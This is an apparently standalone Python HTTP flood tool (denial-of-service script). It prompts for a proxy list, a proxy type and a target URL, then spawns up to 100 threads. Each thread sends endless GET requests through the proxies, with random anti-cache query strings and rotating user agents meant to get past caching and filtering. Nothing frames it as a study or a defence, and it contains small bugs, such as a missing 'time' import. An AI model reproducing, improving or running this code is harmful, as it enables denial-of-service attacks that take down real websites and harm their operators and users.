#!/usr/bin/env python
#version: 0.2
import threading
import random
import logging
import socket
import socks
import sys
import ssl

logging.basicConfig(
	format="[%(asctime)s] %(message)s",
	datefmt="%H:%m:%S"
)
logger = logging.getLogger(__name__)
if "debug" in sys.argv or "d" in sys.argv:
    logger.setLevel(logging.DEBUG)
else:
    logger.setLevel(logging.INFO)
proxy_types = ["http", "socks4", "socks5"]

while True:
    try:
        proxy_list = open(input("Proxy List: "), "r")
        proxies = proxy_list.readlines()
        proxy_list.close()
        break
    except KeyboardInterrupt:
        sys.exit()
    except FileNotFoundError:
        logger.info(f"Proxy list file not found. Try again!")
        pass
    except Exception as e:
        logger.info(f"Unable to open/read proxy list file: {e}")
        pass

while True:
    try:
        proxy_type = input("Proxy Type: ")
        if not proxy_type in proxy_types:
            raise ValueError("Invalid proxy type")
        break
    except KeyboardInterrupt:
        sys.exit()
    except Exception as e:
        logger.info(f"Proxy Type Error: {e}")
        pass

#Set as global variables for faster data processing
chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
chars_list = list(chars)
context = ssl.create_default_context()
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:27.0) Gecko/20100101 Firefox/27.0",
    "AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) ",
    "msnbot-131-253-46-102.search.msn.com",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) ",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/534.34 (KHTML,like Gecko) PhantomJS/1.9.0 (development) Safari/534.34",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
]

active_threads = 0
max_threads = 100
sockets = 0
min_sockets = 30

def urlsplit(url):
    try:
        url = url.strip()
        
        try:
            protocol, host = url.split("://", 1)
            host = host.strip()
            if len(host) == 0:
                raise Exception("Missing URL host")
        except ValueError:
            raise Exception("Missing URL protocol")
        
        try:
            host, path = host.split("/", 1)
        except ValueError:
            path = ""
        
        try:
            host, port = host.split(":", 1)
        except ValueError:
            port = 80
        
        try:
            path, parameters = path.split("?", 1)
        except ValueError:
            parameters = ""
            
        path = f"/{path}"
        
        try:
            port = int(port)
        except ValueError:
            raise Exception("Invalid URL port value")
        
        url_dict = {
            "protocol": protocol,
            "host": host,
            "port": port,
            "path": path,
            "parameters": parameters
        }
        
        return url_dict
    except Exception as e:
        raise Exception(e)
        pass

def hflood(url, **kwargs):
    try:
        global active_threads
        global sockets
        active_threads += 1
        logger.debug(f"Thread {active_threads} started")
        kwargs.setdefault("timeout", 10)
        kwargs.setdefault("proxy", None)
        use_proxy = False
        socket_connected = False
        timeout = int(kwargs["timeout"])
        proxy = kwargs["proxy"]
        if proxy:
            use_proxy = True
        if proxy:
            proxy = urlsplit(proxy)
        url = urlsplit(url)
        protocol = url["protocol"]
        host = url["host"]
        port = url["port"]
        path = url["path"]
        parameters = url["parameters"]
        
        socket.setdefaulttimeout(timeout)
        
        if use_proxy:
            proxy_type = getattr(socks, proxy["protocol"].upper())
            proxy_host = proxy["host"]
            proxy_port = proxy["port"]
        
        if protocol == "https":
            port = 443
        
        port = int(port)
        proxy_port = int(proxy_port)
        
        if protocol == "https":
            if use_proxy:
                sock = socks.socksocket()
                sock.settimeout(timeout)
                sock.set_proxy(proxy_type, proxy_host, proxy_port)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            sock = context.wrap_socket(sock, server_hostname=host)
        else:
            if use_proxy:
                sock = socks.socksocket()
                sock.settimeout(timeout)
                sock.set_proxy(proxy_type, proxy_host, proxy_port)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
        logger.debug(f"Socket connected: {sockets}")
        socket_connected = True
        sockets += 1
        while True:
            anti_cache = random.choices(chars_list, k=77)
            anti_cache = "".join(anti_cache)
            user_agent = random.choice(user_agents)
            http = f"GET {path}?{anti_cache}&{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\n\r\n"
            while True:
                if sockets >= min_sockets:
                    break
            sent = sock.send(http.encode())
            logger.debug(f"Sent {sent} bytes")
            time.sleep(1)
    except Exception as e:
        logger.debug(f"hflood error: {e}")
        pass
    finally:
        active_threads -= 1
        if socket_connected:
            sockets -= 1

while True:
    try:
        url = input("URL: ")
        urlsplit(url)
        break
    except KeyboardInterrupt:
        sys.exit()
    except Exception as e:
        logger.info(f"url error: {e}")
        pass
try:
    while True:
        for proxy in proxies:
            proxy = proxy.strip()
            proxy = f"{proxy_type}://{proxy}"
            while True:
                if active_threads >= max_threads:
                    continue
                threading.Thread(target=hflood, args=[url], kwargs={"proxy": proxy}, daemon=True).start()
                break
except KeyboardInterrupt:
    sys.exit()
except Exception as e:
    logger.info(f"Main Error: {e}")
    pass
